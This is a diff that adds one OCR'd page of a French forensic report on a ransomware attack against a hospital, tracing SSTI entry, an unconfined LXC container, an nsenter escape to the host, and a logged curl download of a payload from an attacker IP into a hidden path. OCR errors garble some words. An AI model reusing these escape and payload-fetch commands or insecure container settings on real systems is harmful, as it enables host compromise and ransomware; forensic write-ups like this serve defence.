@@ -1,0 +1,33 @@
+Source locale : forensic/kissofdeath/ocr/p-010.txt
+Copie documentaire expurgée ; les affirmations restent celles de la source.
+
+7. Dossier 5 - H6pital Central de Tervalis (Ransom Me)
+7.1 Contexte
+L'H6pital Central de Tervalis (HCT) a subi une attaque ransomware ayant mis hors service ses cing plateformes
+médicales : portail public,espace-usager, service RH, bloc opératoire et service de transfusion.
+7.2 Chaine d'attaque
+Phase 1 : Accés initial par injection de template (SSTIJinja2)
+A partir du 16/08/2026 a 15:58:59 (UTC), l'adresse 203.0.113.42 a conduit une reconnaissance des services de l'HCT
+(requétes GET /.git/config, GET /console -> 404). La méme IP avait été sondée dés 14:34:35 (via 203.0.113.17) pour
+tester une injection SSTI.
+Le vecteur d'entrée est le formulaire de réclamation du portail espace-usager :
+POST /espace-usager/reclamation
+message=uid=993(sbx_user1051) gid=990 groups=990
+Le champ message était inséré directement dans un template Jinja2 sans assainissement, permettant une exécution
+de code arbitraire dans le conteneur LXC hct-usager. L'IP 203.0.113.42 a effectué 193 requétes sur cette route.
+Requétes POST, payload SSTI et réponse HTTP 200
+Phase 2 : Evasion du conteneur LXC
+Le conteneur LXC hct-usager présentait une misconfiguration critique dans son fichier de configuration :
+Ixc.apparmor.profile = unconfined
+Ixc.seccomp.profile =
+Ixc.cgroup2.devices.allow =a
+La directive lxc.apparmor. profile = unconfined désactive intégralement le confinement AppArmor, normalement
+responsable du blocage des appels mount(), de la création de device nodes, et des opérations sur les namespaces.
+L'attaquant a exploité cette faille via la commande nsenter --target 1 --mount --uts --ipc --net --pid, qui permet
+d'entrer dans les namespaces du PID 1 de l'hote (init) depuis un processus root dans le conteneur.
+La séquence d'évasion relevée dans usager-access.log :
+[Heures | Commande
+16:29:31 nsenter ... -- id -> root (confirmation d'accés hdte)
+16:29:34 nsenter ... -- mkdir -p /usr/lib/sysmond
+16:29:56 nsenter ... -- curl http://203.0.113.42:8443/svc_update -o /tmp/.svc_update
+16:29:56 nsenter ... -- cp /tmp/.svc_update /usr/lib/sysmond/.sysmond.bin
